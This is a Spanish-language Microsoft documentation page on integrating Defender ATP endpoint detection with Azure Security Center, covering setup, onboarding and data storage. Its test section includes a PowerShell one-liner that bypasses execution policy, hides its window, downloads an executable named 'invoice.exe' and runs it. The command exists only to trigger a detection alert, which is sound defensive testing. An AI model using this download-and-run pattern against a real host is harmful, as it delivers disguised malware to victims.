---
title: 'Protección contra amenazas avanzada de Microsoft Defender: Azure Security Center'
description: En este documento se presenta la integración entre Azure Security Center y la Protección contra amenazas avanzada de Microsoft Defender.
services: security-center
documentationcenter: na
author: memildin
manager: rkarlin
ms.service: security-center
ms.devlang: na
ms.topic: conceptual
ms.tgt_pltfrm: na
ms.workload: na
ms.date: 04/07/2020
ms.author: memildin
ms.openlocfilehash: 28242341ddd21adea33e56c3e1f35f0677e5921a
ms.sourcegitcommit: 53acd9895a4a395efa6d7cd41d7f78e392b9cfbe
ms.translationtype: HT
ms.contentlocale: es-ES
ms.lasthandoff: 09/22/2020
ms.locfileid: "90907363"
---
# <a name="microsoft-defender-advanced-threat-protection-with-azure-security-center"></a>Protección contra amenazas avanzada de Microsoft Defender con Azure Security Center

Azure Security Center se integra con [Advanced Threat Protection (ATP) de Microsoft Defender](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp), que proporciona funcionalidades completas de detección y respuesta (EDR) de puntos de conexión.


## <a name="availability"></a>Disponibilidad

|Aspecto|Detalles|
|----|:----|
|Estado de la versión:|Disponible con carácter general|
|Precios:|Requiere [Azure Defender](security-center-pricing.md).|
|Máquinas admitidas:|![Sí](./media/icons/yes-icon.png) Máquinas de Azure que ejecutan Windows.<br>![Sí](./media/icons/yes-icon.png) Máquinas de Azure Arc que ejecutan Windows.|
|Roles y permisos necesarios:|Para habilitar o deshabilitar la integración: **Administrador de seguridad** o **Propietario**<br>Para ver las alertas de MDATP en Security Center: **Lector de seguridad**, **Lector**, **Colaborador del grupo de recursos**, **Propietario del grupo de recursos**, **Administrador de seguridad**, **Propietario de la suscripción** o **Colaborador de la suscripción**|
|Nubes:|![Sí](./media/icons/yes-icon.png) Nubes comerciales.<br>![No](./media/icons/no-icon.png) Clientes de GCC que ejecutan cargas de trabajo en nubes de Azure públicas<br>![Sí](./media/icons/yes-icon.png) US Gov<br>![No](./media/icons/no-icon.png) China Gov, otros gobiernos|
|||


## <a name="microsoft-defender-atp-features-in-security-center"></a>Características de ATP de Microsoft Defender en Security Center

ATP de Microsoft Defender proporciona lo siguiente:

- **Sensores de detección de brechas de próxima avanzados**: los sensores de ATP de Microsoft Defender de los servidores Windows recopilan una amplia variedad de señales de comportamiento.

- **Detección de brechas basadas en la nube y el análisis**: ATP de Microsoft Defender se adapta rápidamente a las amenazas cambiantes. Utiliza análisis avanzados y macrodatos. ATP de Microsoft Defender se amplía gracias a la eficacia de Intelligent Security Graph con señales a través de Windows, Azure y Office para detectar amenazas desconocidas. Proporciona alertas que requieren intervención y le permite responder rápidamente.

- **Información sobre amenazas**: ATP de Microsoft Defender crea alertas cuando identifica las herramientas, las técnicas y los procedimientos de los atacantes. Usa datos generados por los equipos de seguridad y los buscadores de amenazas de Microsoft, con la ayuda de mecanismos de inteligencia que aportan los partners.


Mediante la integración de ATP de Defender con Azure Security Center, también puede beneficiarse de las siguientes funcionalidades adicionales:

- **Incorporación automatizada**: La integración habilita automáticamente el sensor de ATP de Microsoft Defender para servidores Windows supervisados por Azure Security Center (a menos que ejecuten Windows Server 2019).

- **Panel único**: la consola de Azure Security Center muestra las alertas de ATP de Microsoft Defender. Para obtener más información, use ATP de Microsoft Defender. Asimismo, ATP de Microsoft Defender proporciona información adicional como el árbol de procesos de alerta y el grafo de incidentes. También puede ver una escala de tiempo de la máquina detallada que muestra cada comportamiento durante un período histórico de hasta seis meses.

    ![Página de ATP de Microsoft Defender con información detallada sobre una alerta](media/security-center-wdatp/image3.png)

## <a name="platform-support"></a>Compatibilidad con plataformas

ATP de Microsoft Defender en Security Center admite la detección en los sistemas operativos Windows Server 2016, 2012 R2 y 2008 R2 SP1. En el caso de las máquinas virtuales de Azure, necesitará habilitar Azure Defender en su suscripción y, para las máquinas virtuales que no son de Azure, necesitará que Azure Defender esté habilitado solo en el nivel de área de trabajo.

La supervisión del punto de conexión del servidor que usa esta integración se ha deshabilitado para los clientes de Office 365 GCC.

## <a name="data-storage-location"></a>Ubicación de almacenamiento de datos

Al usar Azure Security Center para supervisar los servidores, se crea automáticamente un inquilino de ATP de Microsoft Defender. Los datos que recopila ATP de Microsoft defender se almacenan en la ubicación geográfica del inquilino identificada durante el aprovisionamiento. Los datos de cliente en formato seudonimizado también se pueden almacenar en los sistemas de procesamiento y almacenamiento central en el Estados Unidos. 

Una vez configurada, la ubicación donde se almacenan los datos no se puede cambiar. Si necesita mover los datos a otra ubicación, póngase en contacto con el Soporte técnico de Microsoft para restablecer el inquilino.


## <a name="onboard-servers-to-security-center"></a>Incorporación de servidores a Security Center 

Para incorporar servidores a Security Center, haga clic en **Ir a Azure Security Center para incorporar los servidores** desde la incorporación del servidor de ATP de Microsoft Defender.

1. En el área de **incorporación**, seleccione o cree el área de trabajo en la que se almacenarán los datos.

2. Si no puede ver todas las áreas de trabajo, puede deberse a una falta de permisos. Asegúrese de que el área de trabajo está protegida con Azure Defender.
    
3. Seleccione **Agregar servidores** para ver instrucciones sobre cómo instalar el agente de Log Analytics. 

4. Después de la incorporación, puede supervisar las máquinas en el [inventario de recursos](asset-inventory.md).

   ![Incorporación de equipos](media/security-center-wdatp/onboard-computers.png)

## <a name="enable-microsoft-defender-atp-integration"></a>Habilitar la integración con ATP de Microsoft Defender

Para comprobar si la integración de ATP de Microsoft Defender está habilitada, seleccione **Security Center** > **Precios y configuración** y haga clic en su suscripción.

Aquí puede ver las integraciones habilitadas actualmente.

  ![Página de configuración de la detección de amenazas de Azure Security Center con la integración de ATP de Microsoft Defender habilitada](media/security-center-wdatp/enable-integrations.png)

- Si ya ha habilitado Azure Defender, no es necesario realizar ninguna otra acción. Azure Security Center incorporará automáticamente los servidores de ATP de Microsoft Defender. Este proceso de incorporación puede tardar hasta 24 horas.

- Si nunca ha incorporado los servidores a Azure Security Center, hágalo y habilite Azure Defender como de costumbre.

- Si ha incorporado los servidores mediante ATP de Microsoft Defender:
  - Consulte la documentación para obtener instrucciones sobre [cómo retirar las máquinas de servidor](https://go.microsoft.com/fwlink/p/?linkid=852906).
  - Incorpore estos servidores a Azure Security Center.

## <a name="access-to-the-microsoft-defender-atp-portal"></a>Acceso al portal de ATP de Microsoft Defender

1. Siga las instrucciones de [Asignar acceso de usuario al portal](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/assign-portal-access).

1. Compruebe si tiene un proxy o firewall que esté bloqueando el tráfico anónimo. El sensor de ATP de Defender se conecta desde el contexto del sistema, por lo que se debe permitir el tráfico anónimo. Para garantizar el acceso sin problemas al portal de ATP de Microsoft Defender, siga las instrucciones de [Habilitar el acceso a las direcciones URL del servicio ATP de Microsoft Defender en el servidor proxy](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-proxy-internet#enable-access-to-microsoft-defender-atp-service-urls-in-the-proxy-server).

## <a name="test-the-feature"></a>Prueba de la característica

Para generar una alerta de prueba inofensiva de ATP de Microsoft Defender:

1. Cree una carpeta "C:\test-MDATP-test".

1. Use Escritorio remoto para acceder a una máquina virtual de Windows Server 2012 R2 o a una máquina virtual de Windows Server 2016. Abra una ventana de línea de comandos.

1. En el símbolo del sistema, copie el siguiente comando y ejecútelo. La ventana del símbolo del sistema se cerrará automáticamente.

    ```
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe'); Start-Process 'C:\\test-MDATP-test\\invoice.exe'
    ```

   ![Una ventana de símbolo del sistema con el comando anterior](media/security-center-wdatp/image4.jpeg)

1. Si el comando se ejecuta correctamente, verá una nueva alerta en el panel de Azure Security Center y el portal de ATP de Microsoft Defender. Esta alerta puede tardar unos minutos en aparecer.

1. Para revisar la alerta en Security Center, vaya a **Security Alerts (Alertas de seguridad)**  > **Suspicious Powershell CommandLine (Línea de comandos de PowerShell sospechosa)** .

1. En la ventana de la investigación, seleccione el vínculo para ir al portal de ATP de Microsoft Defender.

## <a name="next-steps"></a>Pasos siguientes

- [Características y plataformas compatibles con Azure Security Center](security-center-os-coverage.md)
- [Establecimiento de directivas de seguridad en Azure Security Center](tutorial-security-policy.md): aprenda a configurar directivas de seguridad para las suscripciones y los grupos de recursos de Azure.
- [Administración de recomendaciones de seguridad en el Centro de seguridad de Azure](security-center-recommendations.md): aprenda cómo las recomendaciones le ayudarán a proteger los recursos de Azure.
- [Supervisión del estado de seguridad en Azure Security Center](security-center-monitoring.md): Aprenda a supervisar el estado de los recursos de Azure.